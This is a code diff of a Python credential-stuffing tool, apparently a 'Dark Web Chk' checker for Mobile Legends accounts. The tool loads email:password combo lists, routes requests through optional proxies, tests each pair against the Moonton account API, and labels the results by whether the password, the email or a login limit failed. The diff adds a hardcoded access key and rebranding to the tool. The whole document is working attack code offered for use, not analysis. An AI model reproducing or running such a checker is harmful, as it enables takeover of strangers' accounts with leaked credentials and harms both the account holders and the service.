@@ -30,6 +30,28 @@ except ImportError:
   exit(
     'Please restart this tools'
   )
+  
+
+
+
+
+
+password ="Darkwebchk"
+
+for i in range(5, 0 , -1):
+    attemp = input("     Ｉｎｐｕｔ Ｋｅｙ: ")
+    if attemp == password:
+        break
+    else:
+        print(" Ｉｎｃｏｒｒｅｃｔ Ｋｅｙ．．．！")
+
+if i == 1:
+        print("\n Ｆａｉｌｅｄ．．．！ ")
+        exit(
+            )
+else:
+		print(" Ｓｕｃｅｓｓ．．．！ ")
+
 
 api = 'https://accountmtapi.mobilelegends.com/'
 
@@ -46,11 +68,15 @@ class MOONTON:
     self.loop = 0
     print('''\033[0m
 
-|V| _  _ __ _|_ _ __    /  |_  _  _  |  _  __
-| |(_)(_)| | |_(_)| |   \__| |(/_(_  |<(/_ |
-(---------------------------------------------
+____             _     __        __   _        ____ _     _
+|  _ \  __ _ _ __| | __ \ \      / /__| |__    / ___| |__ | | __
+| | | |/ _` | '__| |/ /  \ \ /\ / / _ \ '_ \  | |   | '_ \| |/ /
+| |_| | (_| | |  |   <    \ V  V /  __/ |_) | | |___| | | |   <
+|____/ \__,_|_|  |_|\_\    \_/\_/ \___|_.__/   \____|_| |_|_|\_\
+
+----------------------------------------------------------------
       - Ｍｏｄｉｆｉｅｄ ： ＪＡＹＲ -
----------------------------------------------)
+----------------------------------------------------------------n''')
 ##########################################
 #          Ｄａｒｋ Ｗｅｂ Ｃｈｋ           #
 ##########################################
@@ -60,7 +86,7 @@ class MOONTON:
       re.findall(
         '[a-z-A-Z]',
         string
-      )"
+      )
     )
     if text.islower(
       ) == True:
@@ -89,10 +115,10 @@ class MOONTON:
 
   def main(self):
     print(
-      '[!] Seperator email:password or email|password\n'
+      '[!] Ｆｏｒｍａｔ Ｅｍａｉｌ：Ｐａｓｓｗｏｒｄ\n'
     )
     empas = input(
-      '[?] List empas (ex: list.txt): '
+      '[?] Ｌｉｓｔ （ｅｘ： Ｌｉｓｔ．ｔｘｔ）： '
     )
     if os.path.exists(
       empas
@@ -163,10 +189,10 @@ class MOONTON:
         self.userdata
       ) == 0:
         exit(
-          '[!] Empas does not exist or is invalid, make sure it is formatted email:pass atau email|pass'
+          '[!] Email does not exist or is invalid, make sure it is formatted email:pass atau email|pass'
         )
       print(
-        '[*] Total {0} account'.format(
+        '[*] Ｔｏｔａｌ {0} Ａｃｃｏｕｎｔ'.format(
           str(
             len(
               self.userdata
@@ -175,7 +201,7 @@ class MOONTON:
         )
       )
       ask = input(
-        '[?] Do you want to use a proxy? (\ 033 [92m Recommended \ 033 (0m) [Y/t]: '
+        '[?] Ｄｏ Ｙｏｕ Ｗａｎｔ Ｔｏ Ｕｓｅ Ａ Ｐｒｏｘｙ？ (\033 (0m)  Ｒｅｃｏｍｍｅｎｄｅｄ \033 (0m) [Y/T]: '
       )
       if ask.lower(
       ).strip(
@@ -352,7 +378,7 @@ class MOONTON:
           'message'
          ] == 'Error_PasswdError':
           print(
-            '\r[\033[91mDIEE\033[0m] '+user[
+            '\r[\033[91mWrong P\033[0m] '+user[
               'userdata'
             ]+' -> (\033[91mWrong password\033[0m)'
           )
@@ -376,7 +402,7 @@ class MOONTON:
           'message'
          ] == 'Error_PwdErrorTooMany':
           print(
-            '\r[\033[91mDIEE\033[0m] '+user[
+            '\r[\033[91mLimit\033[0m] '+user[
               'userdata'
             ]+' -> (\033[91mLimit login\033[0m)'
           )
@@ -400,7 +426,7 @@ class MOONTON:
           'message'
         ] == 'Error_NoAccount':
           print(
-            '\r[\033[91mDIEE\033[0m] '+user[
+            '\r[\033[91mWrong E\033[0m] '+user[
               'userdata'
             ]+' -> (\033[91mWrong email\033[0m)'
           )
@@ -421,7 +447,7 @@ class MOONTON:
           )
         else:
           print(
-            '\r[\033[91mDIEE\033[0m] '+user[
+            '\r[\033[91mUnknown\033[0m] '+user[
               'userdata'
             ]+' -> (\033[91mUnknown\033[0m)'
           )
